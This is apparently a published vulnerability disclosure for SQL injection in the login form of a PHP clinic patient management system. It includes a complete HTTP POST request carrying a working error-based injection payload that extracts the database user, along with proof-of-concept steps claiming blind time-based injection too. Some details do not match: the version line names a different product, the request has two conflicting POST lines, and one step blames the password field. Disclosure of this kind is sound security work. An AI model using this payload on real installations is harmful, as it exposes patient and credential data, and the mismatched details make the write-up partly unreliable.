# Clinic's Patient Management System - index.php 'user_name' SQL inject

#### Exploit Title: Clinic's Patient Management System - index.php 'user_name' SQL inject

#### Exploit Author: [webraybtl@webray.com.cn](mailto:webraybtl@webray.com.cn) inc

#### Vendor Homepage: https://www.sourcecodester.com/php-clinics-patient-management-system-source-code

#### Software Link:https://www.sourcecodester.com/php-clinics-patient-management-system-source-code

#### Version: Loan Management System 1.0

#### Tested on: Windows Server 2008 R2 Enterprise, Apache ,Mysql

#### Description

The reason for the SQL injection vulnerability is that the website application does not verify the validity of the data submitted by the user to the server (type, length, business parameter validity, etc.), and does not effectively filter the data input by the user with special characters , so that the user's input is directly brought into the database for execution, which exceeds the expected result of the original design of the SQL statement, resulting in a SQL injection vulnerability.Clinic's Patient Management System does not filter the content correctly at the "index.php /user_name" parameter, resulting in the generation of SQL injection.

#### Payload used:

```POST /login.php HTTP/1.1
POST /index.php HTTP/1.1
Host: 192.168.31.35:8089
Content-Length: 103
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.31.35:8089
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.31.35:8089/index.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=lkdn1jvj1em9c4j3olu9e2pdpo
Connection: close

user_name=admin' AND GTID_SUBSET(CONCAT(0,(SELECT user()),0),3619) AND 'XOyz'='XOyz&password=123&login=
```

#### Proof of Concept

1、Grab the package at the login and find that the login program is in index.php

2、Looking at the source code, it is found that the password field is directly brought into the SQL statement query without filtering

 ![image](https://github.com/joinia/webray.com.cn/blob/main/Clinic's Patient Management System/images/sourcecodesql.png)

3、During manual testing, it is found that SQL error reporting injection exists, so the sensitive information and permissions of the database can be obtained by using the error reporting injection function

 ![image](https://github.com/joinia/webray.com.cn/blob/main/Clinic's Patient Management System/images/sqlresult1.png)

 ![image](https://github.com/joinia/webray.com.cn/blob/main/Clinic's Patient Management System/images/sqlresult.png)

4、Using the tool to test, it is found that there is also blind SQL time injection

 ![image](https://github.com/joinia/webray.com.cn/blob/main/Clinic's Patient Management System/images/sqlresult2.png)

